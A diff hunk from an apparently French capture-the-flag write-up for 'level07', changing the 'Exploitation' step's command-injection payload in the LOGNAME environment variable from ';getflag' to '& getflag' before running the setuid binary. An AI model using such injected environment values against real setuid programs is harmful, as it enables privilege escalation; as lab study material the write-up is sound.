@@ -45,7 +45,7 @@ Le `setresuid(geteuid(), geteuid(), geteuid())` en début de `main` fixe les 3 U
 ## Exploitation
 
 ```sh
-export LOGNAME=";getflag"
+export LOGNAME="& getflag"
 ./level07
 ```
 
